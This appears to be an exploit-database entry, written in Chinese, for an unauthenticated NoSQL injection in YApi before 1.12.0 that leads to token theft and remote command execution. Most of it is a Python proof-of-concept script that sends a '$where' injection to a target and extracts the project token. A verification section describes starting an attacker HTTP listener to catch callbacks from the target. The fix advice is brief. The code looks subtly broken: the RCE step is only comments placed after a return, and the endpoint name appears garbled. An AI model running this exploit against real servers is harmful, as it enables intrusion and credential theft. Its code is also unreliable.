---
id: YAPI-MONGODB-INJ
title: YApi NoSQL注入导致远程命令执行漏洞
product: yapi
vendor: YApi
version_affected: "< 1.12.0"
severity: CRITICAL
tags: [rce, nosql_injection, 无需认证]
fingerprint: ["YApi"]
---

## 漏洞描述

YApi 是一个 API 管理工具。在其 1.12.0 版本之前，存在一处 NoSQL 注入漏洞，通过该漏洞攻击者可以窃取项目 Token，并利用这个 Token 执行任意 Mock 脚本，获取服务器权限。

## 影响版本

- YApi < 1.12.0

## 前置条件

- 无需认证
- 需要 YApi 应用中存在至少一个项目

## 利用步骤

1. 使用 NoSQL 注入获取项目 Token
2. 利用 Token 执行任意 Mock 脚本

## Payload

```python
# 内联POC - YApi NoSQL注入获取Token + RCE
import requests
import json

def exploit_yapi(target_url):
    """利用YApi NoSQL注入漏洞"""
    session = requests.Session()

    # 第一步：NoSQL注入获取项目Token
    print("[*] 尝试NoSQL注入获取Token...")
    inject_payload = {"$where": "function(){return this.project_id==1||true}"}
    try:
        r = session.post(f"{target_url}/api/project/UpsegById", json=inject_payload, timeout=10)
        if r.status_code == 200:
            data = r.json()
            if data.get("errcode") == 0:
                token = data.get("data", {}).get("token")
                print(f"[+] 获取到Token: {token}")
                return token
    except Exception as e:
        print(f"[-] 获取Token失败: {e}")
    return None

    # 第二步：使用Token执行Mock脚本RCE
    # 使用类似YAPI-UNACC的Mock JS脚本RCE

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} target_url")
        sys.exit(1)
    exploit_yapi(sys.argv[1])
```

## 验证方法

```bash
# 此漏洞为NoSQL注入+RCE，需要使用反弹shell或HTTP外带验证
# 攻击者服务器启动HTTP监听
python3 -m http.server 8080

# 使用NoSQL注入获取Token后，利用Mock脚本执行命令
# 具体方法可参考YAPI-UNACC漏洞的利用方式
# 检查HTTP服务器日志是否有来自目标的回连请求
```

## 修复建议

1. 升级 YApi 至 1.12.0+
2. 修复 NoSQL 注入漏洞
3. 对 Mock 脚本进行严格校验
